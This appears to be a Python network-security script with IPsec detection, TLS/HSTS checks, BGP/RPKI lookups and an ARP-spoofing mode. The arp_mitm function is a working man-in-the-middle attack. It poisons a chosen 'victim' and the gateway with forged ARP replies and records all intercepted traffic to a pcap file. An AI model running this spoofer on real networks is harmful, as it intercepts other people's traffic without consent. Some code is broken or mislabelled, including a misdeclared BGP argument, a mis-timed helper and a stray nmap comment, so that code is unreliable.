import requests
import socket
import ssl
from requests.packages.urllib3.exceptions import InsecureRequestWarning, SSLError
from urllib3.exceptions import InsecureRequestWarning
from scapy.all import IP, ESP, AH, sniff, Ether, srp, ARP, conf, get_if_list
import scapy.all as scapy
import subprocess
import sys
import time
import os
from ipaddress import IPv4Network
import threading
import netifaces
import argparse
import re
from datetime import datetime, timedelta
import pybgpstream
import pytz

#----------------------------------------------------------------------------------------------------------------------------------------- 
def check_sudo():
    if not 'SUDO_UID' in os.environ.keys():
        print("Please run the script with sudo!")
        exit()
        
def ipsec():
    def detectProtocol(packet):
        try:
            if IP not in packet:
                return "Invalid Packet: No IP Header" 
            ipHeader = packet[IP] 
            ihl = ipHeader.ihl  #extracts internet header length
            expectedHeaderLength = ihl * 4  #IHL is in 4-byte units
            if len(ipHeader) < expectedHeaderLength:
                return f"Invalid Packet: IP Header Length Mismatch (Expected: {expectedHeaderLength}, Actual: {len(ipHeader)})" #checks if the actual length of the IP header is less than the expected length; 
                                                                                                                            #if it is, it returns an "Invalid Packet: IP Header Length Mismatch" message.
            protocol = ipHeader.proto #extracts protocol number from the header

            #checing for IPSec
            if protocol == 50:  #Protocol number for IPsec ESP
                return "IPsec ESP"
            elif protocol == 51:  #Protocol number for IPsec AH
                return "IPsec AH"
            elif protocol == 6:  #Protocol number for TCP
                return "IP (with TCP)"
            elif protocol == 17:  #Protocol number for UDP
                return "IP (with UDP)"
            else:
                return f"IP (with Unknown Protocol {protocol})"
        except Exception as e: 
            return f"Error during protocol detection: {str(e)}"
        
    def packetHandler(packet):
        try:
            result = detectProtocol(packet)
            print(f"Captured Packet: {result}")
        except Exception as e:
            print(f"Error processing packet: {e}")

    #sniffing packets from the network
    def sniffPackets():
        sniff(prn=packetHandler)

    #starting sniffing in a separate thread
    sniffThread = threading.Thread(target=sniffPackets)
    sniffThread.start()

    #keeping the main thread running
    sniffThread.join()
#Function to check if packets sent from the device is using the TLS protocol
def tls(website):
    requests.packages.urllib3.disable_warnings(InsecureRequestWarning)#disable InsecureRequestWarning to suppress SSL/TLS-related warnings
    def checkSSLTLS(url): #takes a URL as input and checks various SSL/TLS features.
        try:
            # Validate the website URL format
            if not re.match(r'[a-zA-Z0-9-]+(\.[a-z]{2,}){1,2}$', website):
                print("Invalid website format. Please use a format like example.com.")
            #check for HTTPS support
            httpsURL = 'https://' + url #constructing an HTTPS URL.
            responseHTTPS = requests.get(httpsURL, verify=False) #using requests.get to make an http GET request to the provided url with ssl verification disabled
        
            if responseHTTPS.status_code == 200:#if the HTTPS response has a status code of 200, 
                                            #set the protocol to 'https'
           
                urlProtocol = 'https'
        
            else:
                print(f"The website {url} does not support HTTPS and is vulnerable to SSL stripping.") #else print it doesn't support https
                return

            #check HSTS
            if urlProtocol == 'https' and 'Strict-Transport-Security' in responseHTTPS.headers: #checks for HSTS (HTTPS Strict-Transport-Security) in https header
                print(f"The website {httpsURL} has HSTS enabled.") #prints it has hsts
            elif urlProtocol == 'https':
                print(f"The website {httpsURL} does not have HSTS enabled and might be vulnerable to SSL stripping.")#else prints website doesn't have hsts

            hostname = url.split('://', 1)[-1].split('/')[0] # Extract the hostname from the URL.
            sslContext = ssl.create_default_context() # Use ssl.create_default_context() to create a default SSL context
            conn = sslContext.wrap_socket(socket.socket(socket.AF_INET), server_hostname=hostname) # Wrap the socket with the SSL context to create a secure socket.
            conn.connect((hostname, 443)) # Establish a connection to the server using the SSL-wrapped socket.
            
        
            print(f"Cipher suite: {conn.cipher()}")#prints cipher suite
            print(f"SSL/TLS version: {conn.version()}")#prints TLS version-      
            # Check for secure flag in cookies
            if 'Set-Cookie' in responseHTTPS.headers:
                cookies = responseHTTPS.headers['Set-Cookie'].split(';')
                for cookie in cookies:
                    if 'Secure' in cookie:
                        print("Secure flag found in cookies.")
                        break
                else:
                    print("Warning: Some cookies do not have the 'Secure' flag.")#checks for Set-Cookie in the header
        
        except (requests.exceptions.RequestException, SSLError) as e:
            print(f"Error: {e}")#handles errofrs

    checkSSLTLS(website)#takes website as input

#---------------------------------------------------------------------------------------------------------------------------------------------- 

#Function to simulate a arp-spoof based man in the middle attack to check if the network is vulnerable
def arp_mitm(ip_range):

    #Obtain the working directory
    cwd = os.getcwd()
    #This function discovers the network using ARP
    def arp_scan(ip_range):
        # We create an empty list where we will store the pairs of ARP responses.
        devices = list()
        # We utilize scapy's arping (ARP Ping) function to discover the devices on the network
        responses = scapy.arping(ip_range, verbose=0)[0]
    
        # We loop through all the responses and add them to a dictionary and append them to the devices list
        for response in responses:
            # Append the devices' IP addresses and MAC addresses with the use of psrc and hsrc
            # psrc is protocol source, which is the IP address and hwsrc is the hardware source which is the MAC address
            devices.append({"ip" : response[1].psrc, "mac" : response[1].hwsrc})
        return devices
    
    #This function obtains the gateway's IP and MAC address
    def get_gateway_mac_address():
        # Set the destination IP to the IP of your gateway
        gateway_ip = conf.route.route("0.0.0.0")[2]
        # Create an ARP request packet to get the MAC address of the gateway
        arp_request = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=gateway_ip)
        # Send the ARP request and receive the response
        ans, _ = srp(arp_request, timeout=2, verbose=False)
        # Extract and return the MAC address from the response
        if ans:
            return ans[0][1].src
        else:
            return None
        
    #This function obtains the gateway's IP and MAC addresses with the help of get_gateway_mac_addrress function
    def gateway_info(network_info):
        gateways = []
        gws = netifaces.gateways()
        gws1 = gws['default'][netifaces.AF_INET]
        Ip = gws1[0]
        iface_name = gws1[1]
        gateway_mac = get_gateway_mac_address()
        gateways.append({"iface" : iface_name, "ip" : Ip, "mac" : gateway_mac})
        return gateways
    
    #this function creates a list of clients available on the network
    def devices(arp_res, gateway_res):
        #Arguments: arp_res (The response from arp_scan), gateway_res (The response from gatway_info)
        # Gateway is removed from the list, so I will name the list as client_list to avoid ambiguity
        list_clients = []
        for gateway in gateway_res:
            for client in arp_res:
                # All items which are not the gateway will be appended to the client_list.
                if gateway["ip"] != client["ip"]:
                    list_clients.append(client)
        # return the list of the clients which will be used for the menu.
        return list_clients
    
    #this function allows ip forwarding on the network interface card and hence keeps the target's internet connection alive
    def allow_ip_forwarding():
        # You would normally run the command sysctl -w net.ipv4.ip_forward=1 to enable ip forwarding. We run this with subprocess.run()
        subprocess.run(["sysctl", "-w", "net.ipv4.ip_forward=1"])
        # Load  in sysctl settings from the /etc/sysctl.conf file. 
        subprocess.run(["sysctl", "-p", "/etc/sysctl.conf"])
    
    #To update the ARP tables this function needs to be ran twice. Once with the gateway ip and mac, and then with the ip and mac of the target.
    #Arguments: target ip address, target mac, and the spoof ip address.
    def arp_spoofer(target_ip, target_mac, spoof_ip):
        # We want to create an ARP response, by default op=1 which is "who-has" request, to op=2 which is a "is-at" response packet.
        # We can fool the ARP cache by sending a fake packet saying that we're at the router's ip to the target machine, and sending a packet to the router that we are at the target machine's ip.
        pkt = scapy.ARP(op=2,pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
        # ARP is a layer 3 protocol. So we use scapy.send(). We choose it to be verbose so we don't see the output.
        scapy.send(pkt, verbose=False)
    
    # this sends spoof packets to the gateway and the target device.
    def send_spoof_packets():
        while True:
            # We send an arp packet to the gateway saying that we are the the target machine.
            arp_spoofer(gateway_info["ip"], gateway_info["mac"], node_to_spoof["ip"])
            # We send an arp packet to the target machine saying that we are gateway.
            arp_spoofer(node_to_spoof["ip"], node_to_spoof["mac"], gateway_info["ip"])
            # Tested time.sleep() with different values. 3s seems adequate.
            time.sleep(3)
    
    #This function will be a packet sniffer to capture all the packets sent to the computer whilst this computer is the MITM.
    def packet_sniffer(interface):
        # We use the sniff function to sniff the packets going through the gateway interface.
        # The process_sniffed_pkt is a callback function that will run on each packet.
        packets = scapy.sniff(iface = interface, store = False, prn = process_sniffed_pkt)

    #This function is a callback function that works with the packet sniffer. 
    # It receives every packet that goes through scapy.sniff(on_specified_interface) and writes it to a pcap file
    def process_sniffed_pkt(pkt):
        print("Writing to pcap file. Press ctrl + c to exit.")
        # We append every packet sniffed to the requests.pcap file which we can inspect with Wireshark.
        scapy.wrpcap("requests.pcap", pkt, append=True)
    
    def arp_output(arp_res):
        print("_________________________________________________________")
        for id, res in enumerate(arp_res):
            # We are formatting the to print the id (number in the list), the ip and lastly the mac address.
            print("{}\t\t{}\t\t{}".format(id,res['ip'], res['mac']))
        while True:
            try:
                # We have to verify the choice. If the choice is valid then the function returns the choice.
                choice = int(input("Please select the ID of the computer as a victim (ctrl+z to exit): "))
                if arp_res[choice]:
                    return choice
            except:
                print("Please enter a valid ID!")
    
    # If the ip range is not valid, it would've assigned a None value and the program will exit from here.
    if ip_range == None:
        print("No valid ip range specified. Exiting!")
        exit()
    
    allow_ip_forwarding()

    # Do the arp scan. The function returns a list of all clients.
    arpScan = arp_scan(ip_range)

    # If there is no connection exit the script.
    if len(arpScan) == 0:
        print("No connection. Exiting, make sure devices are active or turned on.")
        exit()

    # Obtain the network's gateway
    gateways = gateway_info(arpScan)

    # The gateway will be in position 0 of the list, for easy use we just assign it to a variable.
    gateway_info = gateways[0]

    client_info = devices(arpScan, gateways)

    # If there are no clients, then the program will exit from here.
    if len(client_info) == 0:
        print("No clients found when sending the ARP messages. Exiting, make sure devices are active or turned on.")
        exit()

    # Show the  menu and assign the choice from the function to the variable -> choice
    choice = arp_output(client_info)

    # Select the node to spoof from the client_info list.
    node_to_spoof = client_info[choice]

    # Setup the thread in the background which will send the arp spoof packets.
    t1 = threading.Thread(target=send_spoof_packets, daemon=True)
    # Start the thread.
    t1.start()

    # Change the directory again to the directory which contains the script, so it is a place where you have write privileges,
    os.chdir(cwd)

    # Run the packet sniffer on the interface. So we can capture all the packets and save it to a pcap file that can be opened in Wireshark.
    packet_sniffer(gateway_info["iface"])

#------------------------------------------------------------------------------------------------------------------------------------------------- 

#This code performs a targetted nmap scan which uses the vuln script, to perfrom vulnerability scanning of the services running on the target

def bgp_analysis():
    # at first, we need to get the isp name
    def get_isp_name():
        isp_url = "https://ipinfo.io/json"
        response = requests.get(isp_url)

        if response.status_code == 200:
            response_json = response.json()
            isp_full_name = response_json.get("org", "")
            isp = isp_full_name.split(" ")[0]  # Splits the string and takes the first part (ASN)
            return isp
        else:
            return "Error: Unable to fetch data."


    # Function to check if an ISP is safe using "Is BGP Safe Yet?"
    def check_isp_safety(isp_name):
        api_url = f"https://valid.rpki.isbgpsafeyet.com/api/v1/valid/{isp_name}"
        response = requests.get(api_url)
        if response.status_code == 200:
            res = response.json()
            if res.get('status') == 'valid':
                return {
                "valid": True,
                "asn": res.get('asn', '')
                }
            else:
                return {
                "valid": False,
                "asn": res.get('asn', '')
                }
        else:
            return "Error: Unable to access the API"


    def get_bgp_data(collectors, record_type, start_time, end_time, asn, max_records=10):
        # Initialize PyBGPStream
        stream = pybgpstream.BGPStream(
            collectors=collectors,
            record_type=record_type,
            from_time=start_time,
            until_time=end_time,
            filter="type " + record_type + " and path " + asn
        )

        # Start the stream
        bgp_data = []
        for record in stream:
            if len(bgp_data) >= max_records:
                break
                # Example of extracting only specific fields
            data = {
                'timestamp': record.time,
                'as_path': record.fields['as-path'],
                'prefix': record.fields['prefix'],
                'next_hop': record.fields.get('next-hop', ''),
                'origin': record.fields.get('origin', ''),
                'local_pref': record.fields.get('local-pref', ''),
                'med': record.fields.get('med', ''),
                'communities': record.fields.get('communities', ''),
                'atomic_aggregate': record.fields.get('atomic-aggregate', ''),
                'aggregator': record.fields.get('aggregator', ''),
                'announced_routes': record.fields.get('announced-routes', ''),
                'withdrawn_routes': record.fields.get('withdrawn-routes', ''),
                'collector': record.collector
            }
            bgp_data.append(data)

        return bgp_data


    def get_time_one_hour_ago():
        current_time = datetime.utcnow()
        one_hour_ago = current_time - timedelta(minutes=5)
        return one_hour_ago.strftime("%Y-%m-%d %H:%M:%S")


    def get_current_time():
        return datetime.utcnow().strftime("%Y-%m-%d %H:%M:%S")


    def print_output_checksafety(check_is_safety):
        print("ISP Safety Check Result:")
        print("------------------------\n")

        name = get_isp_name()
        asn = check_is_safety.get('asn', 'unkown')

        print(f"ISP Name: {name}")
        print(f"ASN: {asn}\n")

        if check_is_safety.get('valid'):
            print("Safety Status:\n- BGP is Safe.\n")
        else:
            print("Safety Status:\n- BGP is Unsafe.\n")

        if not isinstance(check_is_safety, str):
            return asn
        
    check_is_safety = check_isp_safety(isp_name=get_isp_name())
    asn = print_output_checksafety(check_is_safety)

    from_time = get_time_one_hour_ago()
    end_time = get_current_time()

    if asn:
        print("Retrieving BGP data from BGPStream...")
        bgp_data = get_bgp_data(["route-views2", "rrc00"], "updates", "2023-01-01 00:00:00", "2023-01-01 03:00:00", '9051')
        if bgp_data:
            print("\nBGP Data:")
            print("----------\n")
            print(bgp_data)

    from_time = get_time_one_hour_ago()
    end_time = get_current_time()
    bgp_data = get_bgp_data(["route-views2", "rrc00"], "updates", from_time, end_time, '9051')
    print(bgp_data)
    data = get_bgp_data(["route-views2", "rrc00"], "updates", "2023-01-01 00:00:00", "2023-01-01 03:00:00", '9051')
    print(data)
#---------------------------------------------------------------------------------------------------------------------------
def main():
    parser = argparse.ArgumentParser(description="Network Security Script")
    parser.add_argument("--ipsec", action="store_true", help="Detect IPsec usage in network traffic")
    parser.add_argument("--tls", metavar="WEBSITE", help="Check SSL/TLS features of a website (format: example.com)")
    parser.add_argument("--arp-mitm", metavar="IP_RANGE", help="Simulate ARP spoofing MITM attack on the specified IP range")
    parser.add_argument("bgp-analysis",action="store_true", help="Check if AS is using SBGP, as well as display BGP data and validity")
    args = parser.parse_args()
    check_sudo()
    if args.ipsec:
        ipsec()
    elif args.tls:
        tls(args.tls) 
    elif args.arp_mitm:
        arp_mitm(args.arp_mitm)
    elif args.bgp_analysis:
        bgp_analysis()
    
    else:
        print("No valid option specified. Use --help for usage information.")

if __name__ == "__main__":
    main()
